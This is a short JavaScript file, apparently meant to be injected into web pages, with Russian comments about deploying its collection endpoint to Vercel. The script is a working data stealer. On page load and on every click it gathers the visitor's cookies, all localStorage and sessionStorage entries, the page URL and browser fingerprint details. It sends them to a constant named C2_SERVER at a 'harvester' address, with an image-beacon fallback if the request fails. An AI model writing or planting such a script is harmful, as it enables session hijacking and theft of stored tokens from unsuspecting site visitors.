(function() {
    'use strict';

    // Этот URL мы получим после деплоя на Vercel
    // Пока оставляем заглушку, потом заменим
    const C2_SERVER = 'https://kvartet-harvester.vercel.app/api/catch';

    function gatherIntel() {
        const intel = {
            cookies: document.cookie || 'none',
            userAgent: navigator.userAgent,
            referrer: document.referrer || 'direct',
            language: navigator.language,
            platform: navigator.platform,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth
            },
            localStorage: {},
            sessionStorage: {},
            url: window.location.href,
            timestamp: new Date().toISOString()
        };

        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                intel.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {
            intel.localStorage = { error: 'blocked' };
        }

        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                intel.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {
            intel.sessionStorage = { error: 'blocked' };
        }

        return intel;
    }

    function exfiltrate(data) {
        fetch(C2_SERVER, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            mode: 'cors'
        })
        .then(() => {
            console.log('[ENI] Payload delivered.');
        })
        .catch(() => {
            const img = new Image();
            img.src = C2_SERVER + '?fallback=' + encodeURIComponent(JSON.stringify(data));
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => exfiltrate(gatherIntel()));
    } else {
        exfiltrate(gatherIntel());
    }

    document.addEventListener('click', () => {
        exfiltrate(gatherIntel());
    });

})();